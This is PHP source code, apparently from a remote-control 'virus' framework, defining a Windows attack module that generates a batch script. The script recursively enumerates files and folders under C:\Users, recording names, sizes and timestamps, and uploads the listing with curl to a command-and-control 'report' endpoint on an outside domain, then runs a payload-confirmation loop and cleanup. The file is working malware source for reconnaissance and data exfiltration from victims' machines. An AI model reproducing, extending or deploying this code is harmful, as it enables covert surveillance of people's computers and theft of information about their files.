<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\BaseScriptWin;

class ExploreDir extends AttackInterface {
    public static int $maxLines = 10000;
    public static int $defaultDepth = 200;

    private string $rootDir = "C:\\Users";
    private int $maxDepth;

    public function __construct() {
        parent::__construct();
        $this->maxDepth = self::$defaultDepth;
    }

    public function getRootDir(): string {
        return $this->rootDir;
    }

    public function setRootDir(string $rootDir): void {
        $this->rootDir = $rootDir;
    }

    public function getMaxDepth(): int {
        return $this->maxDepth;
    }

    public function setMaxDepth(int $maxDepth): void {
        $this->maxDepth = $maxDepth;
    }

    /**
     * This will restore the state of an attack with all of its configuration using a json string.
     *
     * @param string $json The JSON string
     */
    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->rootDir = $state["rootDir"];
        $this->maxDepth = $state["maxDepth"];
    }

    /**
     * This will get the state of an attack as a json string.
     *
     * @return string The JSON string
     */
    protected function getState(): string {
        $state = [];
        $state["rootDir"] = $this->rootDir;
        $state["maxDepth"] = $this->maxDepth;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "dirsFile=@%~pd0echo" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    /**
     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
     *
     * @return string
     */
    //@formatter:off
    public function generateBatchCode(): string {
        ob_start(); ?>
        @echo off
        chCp 65001
        SetLocal EnableDelayedExpansion
        set tmpFile=%~pd0tmp
        set echoFile=%~pd0echo
        set /a linesLimit=<?php echo self::$maxLines . "\n"; ?>
        set /a depthLimit=<?php echo $this->maxDepth . "\n"; ?>
        set /a linesSoFar=0
        set /a count=0
        echo.> !echoFile!

        if not exist "<?php echo $this->rootDir; ?>" (goto ending)
        cd /d "<?php echo $this->rootDir; ?>"
        call :explore_dir
        goto ending

        :explore_dir
        for %%f in ("%cd%\*") do (
            echo !count!;f;%%~zf;%%~tf;%%~nxf>>!echoFile!
            set /a linesSoFar+=1
            if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
        )
        for /d %%d in ("%cd%\*") do (
            echo !count!;d;-;%%~td;%%~nxd>>!echoFile!
            set /a linesSoFar+=1
            if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
            if /i !count! geq !depthLimit! (goto explore_dir_exit)
            set /a count+=1
            cd "%%~d" 2> "!tmpFile!"
            if "!errorLevel!" == "0" (
                call :explore_dir
            )
            cd ..
            set /a count-=1
            if /i !linesSoFar! geq !linesLimit! (goto explore_dir_exit)
        )

        :explore_dir_exit
        exit /b 0

        :ending
        echo %cd%
        cd %~pd0
        <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }
    //@formatter:on

    /**
     * @inheritDoc
     */
    public function processExtras(string $resource): void {
    }
}
